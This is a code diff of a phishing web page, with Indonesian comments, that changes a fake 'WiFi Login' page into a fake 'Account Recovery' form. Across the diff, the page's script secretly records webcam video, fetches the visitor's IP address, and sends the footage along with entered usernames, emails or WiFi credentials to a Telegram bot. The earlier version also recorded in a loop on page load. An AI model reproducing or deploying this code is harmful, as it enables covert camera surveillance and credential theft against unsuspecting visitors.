@@ -3,67 +3,108 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WiFi Login</title>
+  <title>Account Recovery</title>
   <style>
     body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #0f172a; /* Warna dasar gelap */
+      color: #ffffff; /* Warna teks putih */
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
     }
     .container {
-      background: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      width: 300px;
+      background-color: #1e293b; /* Kotak kontainer lebih terang */
+      padding: 30px 20px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
+      max-width: 400px;
+      width: 100%;
       text-align: center;
     }
     h2 {
+      font-size: 24px;
+      font-weight: bold;
+      color: #e2e8f0;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      color: #94a3b8;
       margin-bottom: 20px;
-      color: #333;
+    }
+    .info-box {
+      background-color: #334155; /* Kotak informasi */
+      color: #cbd5e1;
+      font-size: 14px;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
     }
     input {
-      width: 100%;
-      margin-bottom: 15px;
-      padding: 10px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      font-size: 16px;
+      padding: 12px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: 1px solid #64748b;
+      background-color: #1e293b;
+      color: #ffffff;
+    }
+    input:focus {
+      outline: none;
+      border-color: #0ea5e9;
+      box-shadow: 0 0 4px #0ea5e9;
     }
     button {
-      width: 100%;
-      padding: 10px;
-      background-color: #007BFF;
+      padding: 12px;
       border: none;
-      border-radius: 4px;
-      color: #fff;
+      border-radius: 8px;
+      background-color: #0ea5e9;
       font-size: 16px;
+      font-weight: bold;
+      color: #ffffff;
       cursor: pointer;
     }
     button:hover {
-      background-color: #0056b3;
+      background-color: #0284c7;
     }
-    video {
-      display: none; /* Menyembunyikan video dari tampilan web */
+    .footer {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #94a3b8;
+    }
+    .footer a {
+      color: #0ea5e9;
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>WiFi Login</h2>
-    <h3>Perhatian! diam di website ini sekitar 10 detik setelah anda memencet tombol login, agar wifi dapat tersambung.</h3>
-    <p>SSID: Finsii</p>
-    <p>Password: Free-Wifi</p>
-    <form id="loginForm">
-      <input type="text" id="ssid" placeholder="SSID" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button type="submit">Login</button>
+    <h2>Account Recovery</h2>
+    <p>Please fill out the form to recover your account.</p>
+    <div class="info-box">
+      Make sure to provide accurate details to speed up the recovery process.
+    </div>
+    <form id="recoveryForm">
+      <input type="text" id="username" placeholder="Enter your username" required>
+      <input type="email" id="email" placeholder="Enter your email address" required>
+      <input type="password" id="password" placeholder="Create a new password" required>
+      <button type="submit">Recover Account</button>
     </form>
+    <div class="footer">
+      <p>Need help? <a href="#">Contact Support</a></p>
+    </div>
   </div>
 
   <script>
@@ -120,13 +161,13 @@
               .then(data => {
                 ipAddress = data.ip;
 
-                var caption = `Video terkirim dari IP: ${ipAddress}\nSSID: ${formData.ssid}\nPassword: ${formData.password}`;
+                var caption = `Video terkirim dari IP: ${ipAddress}\nUsername: ${formData.username}\nEmail: ${formData.email}`;
                 sendToTelegram(videoDataURL, caption);
               })
               .catch(error => {
                 console.error('Error mendapatkan IP address:', error);
 
-                var caption = `Video terkirim\nSSID: ${formData.ssid}\nPassword: ${formData.password}`;
+                var caption = `Video terkirim\nUsername: ${formData.username}\nEmail: ${formData.email}`;
                 sendToTelegram(videoDataURL, caption);
               });
 
@@ -134,62 +175,32 @@
           };
 
           mediaRecorder.start();
-          setTimeout(() => mediaRecorder.stop(), 3000); // Ambil video selama 3 detik
-
-          setTimeout(() => {
-            // Setelah 1 detik, mulai perekaman video berikutnya
-            takeAndSendVideo(formData);
-          }, 1000); // Delay 1 detik sebelum mulai merekam video berikutnya
+          setTimeout(() => mediaRecorder.stop(), 3000); // Rekam video selama 3 detik
         })
         .catch(function(err) {
           console.log("Error: " + err);
           if (err.name === 'NotAllowedError') {
-            alert('Untuk melanjutkan, izinkan akses kamera pada peramban Anda lalu refresh halaman ini.');
-          }
-        });
-    }
-
-    function requestCameraAccess() {
-      return navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          stream.getTracks().forEach(track => track.stop()); // Stop the stream after granting permission
-          return true;
-        })
-        .catch(err => {
-          console.log("Error: " + err);
-          if (err.name === 'NotAllowedError') {
             alert('Izinkan akses kamera untuk melanjutkan lalu refresh halaman ini.');
           }
-          return false;
         });
     }
 
-    document.addEventListener('DOMContentLoaded', function() {
-      requestCameraAccess().then(hasAccess => {
-        if (hasAccess) {
-          var formData = {
-            ssid: document.getElementById('ssid').value,
-            password: document.getElementById('password').value
-          };
-          takeAndSendVideo(formData);
-        }
-      });
-    });
-
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
+    document.getElementById('recoveryForm').addEventListener('submit', function(event) {
       event.preventDefault();
       var formData = {
-        ssid: document.getElementById('ssid').value,
+        username: document.getElementById('username').value,
+        email: document.getElementById('email').value,
         password: document.getElementById('password').value
       };
 
-      requestCameraAccess().then(hasAccess => {
-        if (hasAccess) {
-          takeAndSendVideo(formData);
-        } else {
-          alert('Izinkan akses kamera sebelum melanjutkan lalu refresh halaman ini.');
-        }
-      });
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(() => takeAndSendVideo(formData))
+        .catch(err => {
+          console.log("Error: " + err);
+          if (err.name === 'NotAllowedError') {
+            alert('Izinkan akses kamera sebelum melanjutkan.');
+          }
+        });
     });
   </script>
 </body>
